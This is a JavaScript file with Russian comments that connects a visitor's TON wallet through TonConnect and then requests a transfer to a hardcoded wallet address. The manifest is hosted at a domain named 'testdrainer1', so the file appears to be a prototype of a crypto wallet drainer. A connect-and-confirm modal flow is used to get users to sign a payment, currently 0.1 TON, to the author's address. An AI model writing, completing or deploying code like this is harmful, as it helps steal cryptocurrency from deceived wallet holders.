// Инициализация TonConnect
let tonConnectUI;

function initTonConnect() {
    try {
        tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://testdrainer1.netlify.app/tonconnect-manifest.json',
            buttonRootId: 'connect-widget'
        });

        // Обработчик изменения статуса кошелька
        tonConnectUI.onStatusChange((wallet) => {
            if (wallet) {
                console.log('Кошелек подключен:', wallet);
                closeModal('connect-modal');
                openModal('confirm-modal');
            } else {
                console.log('Кошелек отключен');
            }
        });

        console.log('TonConnect успешно инициализирован');
    } catch (error) {
        console.error('Ошибка инициализации TonConnect:', error);
    }
}

// Функция для отправки токенов
async function sendTokens() {
    const confirmBtn = document.getElementById('confirm-transfer-btn');
    if (!confirmBtn) return;

    try {
        confirmBtn.disabled = true;
        confirmBtn.textContent = 'Обработка...';
        
        if (!tonConnectUI || !tonConnectUI.connected || !tonConnectUI.account) {
            throw new Error('Кошелек не подключен');
        }

        // Здесь будет логика отправки токенов
        // Пример:
        const transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 300,
            messages: [{
                address: 'UQAto6-GBiUxylKE_3WwrRdQ47wArfW3hemtjjmwZdJesExp',
                amount: '100000000' // 0.1 TON в нанотонах
            }]
        };

        const result = await tonConnectUI.sendTransaction(transaction);
        console.log('Транзакция успешна:', result);
        
        setTimeout(() => {
            closeModal('confirm-modal');
            alert('Транзакция успешно отправлена!');
            confirmBtn.disabled = false;
            confirmBtn.textContent = 'Отправить токены';
        }, 1000);
        
    } catch (error) {
        console.error('Ошибка:', error);
        alert('Произошла ошибка: ' + error.message);
        confirmBtn.disabled = false;
        confirmBtn.textContent = 'Отправить токены';
    }
}

// Инициализация после загрузки TonConnect SDK
window.addEventListener('load', () => {
    if (window.TON_CONNECT_UI) {
        initTonConnect();
    } else {
        console.error('TonConnect UI не загружен');
    }
});

// Экспортируем функции
window.sendTokens = sendTokens;
window.openModal = openModal;
window.closeModal = closeModal;
